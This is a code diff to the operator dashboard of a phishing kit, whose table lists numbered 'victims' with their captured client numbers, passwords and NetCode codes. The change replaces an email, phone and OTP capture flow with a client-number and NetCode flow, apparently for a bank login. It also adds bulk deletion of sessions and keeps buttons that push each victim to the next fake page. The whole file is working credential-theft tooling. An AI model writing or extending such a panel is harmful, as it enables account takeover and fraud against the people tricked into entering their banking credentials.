@@ -4,8 +4,8 @@
   <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
   <title>$$$</title>
-  <link rel="preconnect" href="https://rsms.me">
-  <link rel="stylesheet" href="https://rsms.me/inter/inter.css">
+  <link rel="preconnect" href="https://rsms.me ">
+  <link rel="stylesheet" href="https://rsms.me/inter/inter.css ">
   <style>
     :root {
       --bg: #000000;
@@ -218,10 +218,84 @@
     
     .stats{grid-template-columns:repeat(3,1fr)}.stat-label{font-size:11px;font-weight:500;letter-spacing:.18em;text-transform:uppercase;color:var(--text-muted)}.stat-value{margin-top:12px;font-size:34px;font-weight:600;line-height:1.05}
     
+    /* Bulk action bar */
+    .bulk-bar {
+      display:none;
+      align-items:center;
+      justify-content:space-between;
+      padding:12px 16px;
+      background:rgba(251,113,133,0.1);
+      border:1px solid rgba(251,113,133,0.3);
+      border-radius:12px;
+      margin-bottom:16px;
+      backdrop-filter:blur(10px);
+      animation:slideDown 0.2s ease;
+    }
+    .bulk-bar.active { display:flex; }
+    .bulk-info { font-size:13px; color:var(--text-primary); }
+    .bulk-info span { font-weight:600; color:var(--red); }
+    .bulk-actions { display:flex; gap:8px; }
+    
+    @keyframes slideDown {
+      from { opacity:0; transform:translateY(-10px); }
+      to { opacity:1; transform:translateY(0); }
+    }
+    
+    /* Checkbox styles */
+    .checkbox-wrapper {
+      display:flex;
+      align-items:center;
+      justify-content:center;
+    }
+    .custom-checkbox {
+      width:18px;
+      height:18px;
+      border:2px solid var(--card-border);
+      border-radius:5px;
+      background:rgba(128,128,128,0.1);
+      cursor:pointer;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      transition:all 0.15s ease;
+      position:relative;
+    }
+    .custom-checkbox:hover {
+      border-color:var(--text-muted);
+      background:rgba(128,128,128,0.15);
+    }
+    .custom-checkbox.checked {
+      background:var(--red);
+      border-color:var(--red);
+    }
+    .custom-checkbox.checked::after {
+      content:'✕';
+      color:#fff;
+      font-size:11px;
+      font-weight:bold;
+    }
+    .custom-checkbox.indeterminate {
+      background:var(--yellow);
+      border-color:var(--yellow);
+    }
+    .custom-checkbox.indeterminate::after {
+      content:'−';
+      color:#000;
+      font-size:11px;
+      font-weight:bold;
+    }
+    
+    th .custom-checkbox {
+      width:16px;
+      height:16px;
+    }
+    
     table{width:100%;font-size:.9rem;border-collapse:collapse;margin-top:1rem}
     th{text-align:left;padding:.6rem .5rem;border-bottom:1px solid var(--table-border);font-weight:500;font-size:.8rem;text-transform:uppercase;color:var(--text-muted)}
     td{padding:.6rem .5rem;border-bottom:1px solid var(--card-border)}
     tr:hover{background:var(--table-hover)}
+    tr.selected { background:rgba(251,113,133,0.05); }
+    tr.selected td { color:var(--red); }
     
     .btn {
       padding:.35rem .75rem;
@@ -238,6 +312,18 @@
       background:rgba(128,128,128,0.15);
       border-color:var(--text-muted);
       transform:translateY(-1px);
+    }
+    .btn-danger {
+      background:rgba(251,113,133,.12);
+      border-color:rgba(251,113,133,.4);
+      color:var(--red);
+    }
+    .btn-danger:hover {
+      background:rgba(251,113,133,.22);
+    }
+    .btn-secondary {
+      background:rgba(128,128,128,0.08);
+      border-color:var(--card-border);
     }
     
     .icon-btn {
@@ -277,7 +363,7 @@
     
     .detail{font-size:12px;color:var(--text-muted);margin-top:8px}
     
-    #modal, #settingsModal, #confirmModal {
+    #modal, #settingsModal, #confirmModal, #bulkConfirmModal {
       display:none;
       position:fixed;
       inset:0;
@@ -288,9 +374,9 @@
       backdrop-filter:blur(8px);
     }
     #settingsModal{background:rgba(0,0,0,.7)}
-    #confirmModal{z-index:1001}
+    #confirmModal, #bulkConfirmModal {z-index:1001}
     
-    #modal .card, #settingsModal .card, #confirmModal .card {
+    #modal .card, #settingsModal .card, #confirmModal .card, #bulkConfirmModal .card {
       max-width:600px;
       width:90%;
       background:var(--card-bg);
@@ -301,7 +387,7 @@
       backdrop-filter:var(--glass-blur) var(--glass-saturation);
     }
     #settingsModal .card{max-width:420px}
-    #confirmModal .card{max-width:380px;text-align:center}
+    #confirmModal .card, #bulkConfirmModal .card {max-width:380px;text-align:center}
     #empty{text-align:center;color:var(--text-muted);padding:2rem 0}
 
     .modal-header{border-bottom:1px solid var(--card-border);padding-bottom:16px;margin-bottom:20px}
@@ -343,10 +429,6 @@
     .activity-time{font-size:11px;color:var(--text-muted);white-space:nowrap;margin-left:16px;font-family:monospace}
 
     .delete-section{margin-top:20px;padding-top:20px;border-top:1px solid var(--card-border);display:flex;justify-content:space-between;align-items:center}
-    .delete-info{font-size:12px;color:var(--text-muted)}
-    .btn-danger{background:rgba(251,113,133,.12);border-color:rgba(251,113,133,.4);color:var(--red);padding:8px 16px}
-    .btn-danger:hover{background:rgba(251,113,133,.22)}
-    .btn-secondary{background:rgba(128,128,128,0.08);border-color:var(--card-border)}
 
     #alert-container{position:fixed;top:20px;right:20px;z-index:10000;display:flex;flex-direction:column;gap:10px;max-width:400px}
     .alert {
@@ -447,12 +529,13 @@
       .stats{grid-template-columns:1fr;gap:12px}
       .stat-value{font-size:28px}
       .card{padding:16px;border-radius:16px}
+      .bulk-bar { flex-direction:column; gap:12px; align-items:stretch; }
       table{font-size:0.75rem;display:block;overflow-x:auto;white-space:nowrap;-webkit-overflow-scrolling:touch}
       th,td{padding:0.4rem 0.3rem}
       .cred{font-size:0.7rem;padding:3px 6px}
       .icon-btn{width:32px;height:32px;padding:6px}
       .icon-btn img{width:16px;height:16px}
-      #modal .card, #settingsModal .card, #confirmModal .card{width:95%;padding:20px;border-radius:16px}
+      #modal .card, #settingsModal .card, #confirmModal .card, #bulkConfirmModal .card {width:95%;padding:20px;border-radius:16px}
       .modal-title{font-size:18px}
       .info-grid{grid-template-columns:1fr;gap:12px}
       .info-section{padding:12px}
@@ -474,7 +557,7 @@
       .stat-label{font-size:10px}
       table{font-size:0.7rem}
       th,td{padding:0.3rem 0.2rem}
-      td:nth-child(7),th:nth-child(7),td:nth-child(8),th:nth-child(8){display:none}
+      td:nth-child(8),th:nth-child(8),td:nth-child(9),th:nth-child(9){display:none}
       .theme-grid{grid-template-columns:repeat(2, 1fr);}
     }
   </style>
@@ -513,9 +596,19 @@
     </div>
 
     <div class="card" style="margin-top:22px">
+      <!-- Bulk Action Bar -->
+      <div class="bulk-bar" id="bulkBar">
+        <div class="bulk-info"><span id="bulkCount">0</span> sessions selected</div>
+        <div class="bulk-actions">
+          <button class="btn btn-secondary" onclick="clearSelection()">Cancel</button>
+          <button class="btn btn-danger" onclick="confirmBulkDelete()">Delete Selected</button>
+        </div>
+      </div>
+
       <div style="font-size:14px;font-weight:600;margin-bottom:12px">Active Sessions · <a id="domainLink" href="#" target="_blank" style="color:var(--blue);text-decoration:none"></a></div>
       <table id="tbl"><thead><tr>
-        <th>#</th><th>Client</th><th>PIN</th><th>Phone</th><th>OTP</th><th>IP</th><th>Platform</th><th>Browser</th><th>Status</th><th>Actions</th>
+        <th style="width:40px"><div class="custom-checkbox" id="selectAll" onclick="toggleSelectAll()"></div></th>
+        <th>#</th><th>Client #</th><th>Password</th><th>NetCode</th><th>IP</th><th>Platform</th><th>Browser</th><th>Status</th><th>Actions</th>
       </tr></thead><tbody></tbody></table>
       <div id="empty">No active sessions</div>
     </div>
@@ -579,9 +672,9 @@
             <button class="theme-option" id="themeLight" onclick="setTheme('light')">Light</button>
           </div>
           <div class="theme-grid" id="themeGrid">
-            <div class="theme-thumb" data-theme="theme1" data-name="Aurora" onclick="setTheme('theme1')" style="background-image:url('/images/theme1.jpg')"></div>
-            <div class="theme-thumb" data-theme="theme2" data-name="Forest" onclick="setTheme('theme2')" style="background-image:url('/images/theme2.jpg')"></div>
-            <div class="theme-thumb" data-theme="theme3" data-name="Ocean" onclick="setTheme('theme3')" style="background-image:url('/images/theme3.jpg')"></div>
+            <div class="theme-thumb" data-theme="theme1" data-name="Ocean" onclick="setTheme('theme1')" style="background-image:url('/images/theme1.jpg')"></div>
+            <div class="theme-thumb" data-theme="theme2" data-name="Deep" onclick="setTheme('theme2')" style="background-image:url('/images/theme2.jpg')"></div>
+            <div class="theme-thumb" data-theme="theme3" data-name="Forest" onclick="setTheme('theme3')" style="background-image:url('/images/theme3.jpg')"></div>
             <div class="theme-thumb" data-theme="theme4" data-name="Dream" onclick="setTheme('theme4')" style="background-image:url('/images/theme4.jpg')"></div>
           </div>
         </div>
@@ -613,13 +706,119 @@
     </div>
   </div>
 
+  <!-- Bulk Delete Confirm Modal -->
+  <div id="bulkConfirmModal" onclick="if(event.target===this)closeBulkConfirm()">
+    <div class="card">
+      <div class="modal-title" style="margin-bottom:8px;color:var(--red)">⚠️ Delete Selected Sessions?</div>
+      <div class="confirm-text">
+        You are about to delete <strong id="bulkConfirmCount">0</strong> selected sessions.<br><br>
+        This action cannot be undone.
+      </div>
+      <div class="confirm-buttons">
+        <button class="confirm-btn" onclick="closeBulkConfirm()">Cancel</button>
+        <button class="confirm-btn danger" onclick="executeBulkDelete()">Delete</button>
+      </div>
+    </div>
+  </div>
+
   <script>
     let currentSid = null, jsonData = {}, lastSessions = new Map();
     let isFirstLoad = true;
+    let selectedSessions = new Set();
     const qs = s => document.querySelector(s);
     const qsa = s => document.querySelectorAll(s);
     const fmt = t => new Date(t).toLocaleTimeString();
     const fmtDate = t => new Date(t).toLocaleString();
+
+    /* ----------  BULK SELECTION  ---------- */
+    function toggleSelectAll() {
+      const checkboxes = document.querySelectorAll('.row-checkbox');
+      const allChecked = selectedSessions.size === jsonData.sessions.length && jsonData.sessions.length > 0;
+      
+      if (allChecked) {
+        selectedSessions.clear();
+      } else {
+        jsonData.sessions.forEach(s => {
+          if (!isApproved(s)) selectedSessions.add(s.sid);
+        });
+      }
+      
+      updateSelectionUI();
+    }
+
+    function toggleRow(sid) {
+      if (selectedSessions.has(sid)) {
+        selectedSessions.delete(sid);
+      } else {
+        selectedSessions.add(sid);
+      }
+      updateSelectionUI();
+    }
+
+    function updateSelectionUI() {
+      qsa('.row-checkbox').forEach(cb => {
+        const sid = cb.dataset.sid;
+        cb.classList.toggle('checked', selectedSessions.has(sid));
+      });
+      
+      const selectAll = qs('#selectAll');
+      const totalRows = jsonData.sessions ? jsonData.sessions.filter(s => !isApproved(s)).length : 0;
+      
+      selectAll.classList.remove('checked', 'indeterminate');
+      if (selectedSessions.size === 0) {
+      } else if (selectedSessions.size === totalRows && totalRows > 0) {
+        selectAll.classList.add('checked');
+      } else {
+        selectAll.classList.add('indeterminate');
+      }
+      
+      qsa('tr[data-sid]').forEach(row => {
+        row.classList.toggle('selected', selectedSessions.has(row.dataset.sid));
+      });
+      
+      const bulkBar = qs('#bulkBar');
+      const bulkCount = qs('#bulkCount');
+      
+      if (selectedSessions.size > 0) {
+        bulkBar.classList.add('active');
+        bulkCount.textContent = selectedSessions.size;
+      } else {
+        bulkBar.classList.remove('active');
+      }
+    }
+
+    function clearSelection() {
+      selectedSessions.clear();
+      updateSelectionUI();
+    }
+
+    function confirmBulkDelete() {
+      if (selectedSessions.size === 0) return;
+      qs('#bulkConfirmCount').textContent = selectedSessions.size;
+      qs('#bulkConfirmModal').style.display = 'flex';
+    }
+
+    function closeBulkConfirm() {
+      qs('#bulkConfirmModal').style.display = 'none';
+    }
+
+    async function executeBulkDelete() {
+      const sids = Array.from(selectedSessions);
+      closeBulkConfirm();
+      
+      for (const sid of sids) {
+        await fetch('/api/panel', {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify({action: 'delete', sid: sid})
+        });
+      }
+      
+      selectedSessions.clear();
+      updateSelectionUI();
+      showAlert('success', 'BULK DELETE', `Deleted ${sids.length} sessions`, '-');
+      load();
+    }
 
     /* ----------  THEME  ---------- */
     function loadTheme() {
@@ -628,27 +827,22 @@
     }
     
     function setTheme(theme, save = true) {
-      // Remove all theme attributes first
       document.documentElement.removeAttribute('data-theme');
       
-      // Set new theme
       if (theme !== 'dark' && theme !== 'light') {
         document.documentElement.setAttribute('data-theme', theme);
       } else {
         document.documentElement.setAttribute('data-theme', theme);
       }
       
-      // Update UI toggles
       qsa('.theme-option').forEach(el => el.classList.remove('active'));
       const themeBtn = qs(`#theme${theme.charAt(0).toUpperCase() + theme.slice(1)}`);
       if (themeBtn) themeBtn.classList.add('active');
       
-      // Update background layers
       qsa('.bg-layer').forEach((el, i) => {
         el.classList.toggle('active', el.id === `bg${theme.replace('theme', '')}`);
       });
       
-      // Update theme grid selection
       qsa('.theme-thumb').forEach(el => {
         el.classList.toggle('active', el.dataset.theme === theme);
       });
@@ -675,7 +869,7 @@
         <div class="alert-content">
           <div class="alert-title">${title}</div>
           <div class="alert-desc">${desc}</div>
-          <div class="alert-time">Victim #${victimNum} • ${fmt(Date.now())}</div>
+          ${victimNum !== '-' ? `<div class="alert-time">Victim #${victimNum} • ${fmt(Date.now())}</div>` : `<div class="alert-time">${fmt(Date.now())}</div>`}
         </div>`;
       alert.onclick = () => alert.remove();
       container.appendChild(alert);
@@ -685,10 +879,8 @@
     /* ----------  STATUS  ---------- */
     function statusText(s){
       if (s.page==='success' || s.status==='approved') return '';
-      if (s.page==='index.html' && s.entered) return '<div style="font-size:11px;color:var(--green)">ENTERED CREDENTIALS</div>';
-      if (s.page==='verify.html' && s.phone) return '<div style="font-size:11px;color:var(--blue)">ENTERED PHONE</div>';
-      if (s.page==='unregister.html' && s.unregisterClicked) return '<div style="font-size:11px;color:var(--yellow)">CLICKED UNREGISTER</div>';
-      if (s.page==='otp.html' && s.otp) return '<div style="font-size:11px;color:var(--green)">ENTERED OTP</div>';
+      if (s.page==='index.html' && s.clientNumber) return '<div style="font-size:11px;color:var(--green)">ENTERED CLIENT #</div>';
+      if (s.page==='verify.html' && s.netcode) return '<div style="font-size:11px;color:var(--green)">ENTERED NETCODE</div>';
       return '<div style="font-size:11px;color:var(--text-muted)">WAITING</div>';
     }
 
@@ -697,15 +889,10 @@
       let html = '<div style="display:flex;gap:6px">';
       html += `<button class="icon-btn manage" onclick="showDetail('${s.sid}')" title="View Details"><img src="/images/description-svgrepo-com.svg"></button>`;
       if (s.page === 'success' || s.status === 'approved') return html + '</div>';
-      if (s.page === 'index.html' && (s.entered || (s.email && s.password))) {
+      if (s.page === 'index.html' && s.clientNumber) {
         html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue"><img src="/images/arrow-right-square-svgrepo-com.svg"></button>`;
         html += `<button class="icon-btn redo" onclick="act('redo','${s.sid}')" title="Redo"><img src="/images/cross-square-svgrepo-com.svg"></button>`;
-      } else if (s.page === 'verify.html' && s.phone) {
-        html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue"><img src="/images/arrow-right-square-svgrepo-com.svg"></button>`;
-        html += `<button class="icon-btn redo" onclick="act('redo','${s.sid}')" title="Redo"><img src="/images/cross-square-svgrepo-com.svg"></button>`;
-      } else if (s.page === 'unregister.html' && s.unregisterClicked) {
-        html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue"><img src="/images/arrow-right-square-svgrepo-com.svg"></button>`;
-      } else if (s.page === 'otp.html' && s.otp) {
+      } else if (s.page === 'verify.html' && s.netcode) {
         html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue"><img src="/images/arrow-right-square-svgrepo-com.svg"></button>`;
         html += `<button class="icon-btn redo" onclick="act('redo','${s.sid}')" title="Redo"><img src="/images/cross-square-svgrepo-com.svg"></button>`;
       }
@@ -724,12 +911,10 @@
         const old = lastSessions.get(s.sid);
         if (!old) {
           showAlert('info', 'NEW VISITOR', `Connected from ${s.ip}`, s.victimNum);
-          if (s.entered) showAlert('success', 'ENTERED CREDENTIALS', `Client: ${s.email}`, s.victimNum);
+          if (s.clientNumber) showAlert('success', 'ENTERED CLIENT #', `Client: ${s.clientNumber}`, s.victimNum);
         } else {
-          if (!old.entered && s.entered) showAlert('success', 'ENTERED CREDENTIALS', `Client: ${s.email}`, s.victimNum);
-          if (!old.phone && s.phone) showAlert('info', 'ENTERED PHONE', `Phone: ${s.phone}`, s.victimNum);
-          if (!old.unregisterClicked && s.unregisterClicked) showAlert('warning', 'CLICKED UNREGISTER', 'Victim proceeded to unregister', s.victimNum);
-          if (!old.otp && s.otp) showAlert('success', 'ENTERED OTP', `OTP: ${s.otp}`, s.victimNum);
+          if (!old.clientNumber && s.clientNumber) showAlert('success', 'ENTERED CLIENT #', `Client: ${s.clientNumber}`, s.victimNum);
+          if (!old.netcode && s.netcode) showAlert('success', 'ENTERED NETCODE', `NetCode: ${s.netcode}`, s.victimNum);
           if ((old.page !== 'success' && s.page === 'success') || (old.status !== 'approved' && s.status === 'approved')) {
             showAlert('success', 'LOGIN APPROVED', 'Victim completed full flow', s.victimNum);
           }
@@ -743,9 +928,7 @@
       if (f === 'success') return 'APPROVED';
       switch(f){
         case 'index.html': return 'LOGIN';
-        case 'verify.html': return 'PHONE';
-        case 'unregister.html': return 'UNREGISTER';
-        case 'otp.html': return 'OTP';
+        case 'verify.html': return 'NETCODE';
         default: return f;
       }
     }
@@ -774,15 +957,24 @@
       if(!d.sessions.length){ body.innerHTML=''; empty.style.display='block'; return; }
       empty.style.display='none';
       
+      const currentSids = new Set(d.sessions.map(s => s.sid));
+      selectedSessions.forEach(sid => {
+        if (!currentSids.has(sid)) selectedSessions.delete(sid);
+      });
+      updateSelectionUI();
+      
       body.innerHTML = d.sessions.map(s => {
         const approved = isApproved(s);
+        const isSelected = selectedSessions.has(s.sid);
         return `
-        <tr data-sid="${s.sid}" class="${approved ? 'approved' : ''}">
+        <tr data-sid="${s.sid}" class="${approved ? 'approved' : ''} ${isSelected ? 'selected' : ''}">
+          <td class="checkbox-wrapper">
+            ${!approved ? `<div class="custom-checkbox row-checkbox ${isSelected ? 'checked' : ''}" data-sid="${s.sid}" onclick="event.stopPropagation(); toggleRow('${s.sid}')"></div>` : ''}
+          </td>
           <td>${s.victimNum}</td>
-          <td><span class="cred">${s.email||'—'}</span></td>
+          <td><span class="cred">${s.clientNumber||'—'}</span></td>
           <td><span class="cred">${s.password||'—'}</span></td>
-          <td><span class="cred">${s.phone||'—'}</span></td>
-          <td><span class="cred">${s.otp||'—'}</span></td>
+          <td><span class="cred">${s.netcode||'—'}</span></td>
           <td><a class="ip-link" onclick="openIpLookup('${s.ip}')" title="Lookup IP">${s.ip}</a></td>
           <td>${s.platform}</td>
           <td>${s.browser}</td>
@@ -795,7 +987,7 @@
     /* ----------  IP LOOKUP  ---------- */
     function openIpLookup(ip) {
       const cleanIp = ip.split(':')[0];
-      window.open(`https://db-ip.com/${cleanIp}`, '_blank');
+      window.open(`https://db-ip.com/ ${cleanIp}`, '_blank');
     }
 
     /* ----------  MODALS  ---------- */
@@ -831,19 +1023,15 @@
           </div>
           <div class="info-section">
             <div class="info-label">Client Number</div>
-            <div class="info-value mono">${s.email||'—'}</div>
+            <div class="info-value mono">${s.clientNumber||'—'}</div>
           </div>
           <div class="info-section">
-            <div class="info-label">PIN / Password</div>
+            <div class="info-label">Password</div>
             <div class="info-value mono">${s.password||'—'}</div>
           </div>
           <div class="info-section">
-            <div class="info-label">Phone Number</div>
-            <div class="info-value mono">${s.phone||'—'}</div>
-          </div>
-          <div class="info-section">
-            <div class="info-label">OTP Code</div>
-            <div class="info-value mono">${s.otp||'—'}</div>
+            <div class="info-label">NetCode</div>
+            <div class="info-value mono">${s.netcode||'—'}</div>
           </div>
           <div class="info-section full-width">
             <div class="info-label">System Information</div>
@@ -929,7 +1117,7 @@
     qs('#logoutBtn').onclick = async () => {
       lastSessions.clear();
       isFirstLoad = true;
-      await fetch('/panel/logout',{method:'POST'});
+      await fetch('/panel/logout',{method: 'POST'});
       location.replace('/panel');
     };
     qs('#exportBtn').onclick = () => location.href = '/api/export';
